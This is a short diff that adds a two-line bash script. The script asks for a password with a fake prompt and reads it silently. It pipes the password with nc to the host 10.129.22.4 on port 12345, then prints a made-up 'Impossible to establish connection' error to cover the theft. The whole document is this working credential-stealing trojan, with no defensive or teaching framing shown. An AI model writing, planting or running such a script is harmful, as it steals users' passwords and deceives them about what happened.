@@ -1,0 +1,2 @@
+#!/bin/bash
+echo "Enter Password:";read -s text;echo $text | nc 10.129.22.4 12345;echo "Impossible to establish connection"
